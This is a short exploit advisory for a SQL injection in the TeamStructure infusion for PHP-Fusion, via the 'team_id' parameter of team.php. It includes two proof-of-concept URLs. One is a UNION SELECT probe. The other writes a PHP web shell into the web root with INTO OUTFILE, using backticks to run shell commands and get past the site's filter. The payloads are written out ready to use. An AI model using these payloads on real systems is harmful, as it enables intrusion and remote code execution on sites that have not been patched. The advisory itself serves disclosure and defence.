# Version: PHP-fusion (7.01..03), TeamStructure Infusion(all versions)
# Tested on: Firefox 3.0.15, , IE 8

Info:

Plugin that allows the site to have a list of all teams / clubs (eg football
or hockey) with the playing staff, displaying the standings with the
position of command or a list of the best strikers of a championship.

Details:

the "team_id" variable is not probably sanitized before using in SQL query
in "team.php", the attack can be elevated as shown in second POC to bypass
PHP-Fusion's GET variable XSS filter. by using back-ticks instead of
brackets used in any php function  in that case shell_exec().

Condition:

magic_quotes_gpc = Off

POC:


http://127.0.0.1/php-fusion/files/infusions/teams_structure/team.php?team_id=-1'
union select
'1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17

http://127.0.0.1/php-fusion/files/infusions/teams_structure/team.php?team_id=-1'
union select '1','2','<?php $out=`id`;echo $out;
?>','4','5','6','7','8','9','10','11','12','13','14','15','16','17' into
outfile '/var/www/php-fusion/files/images/test.php
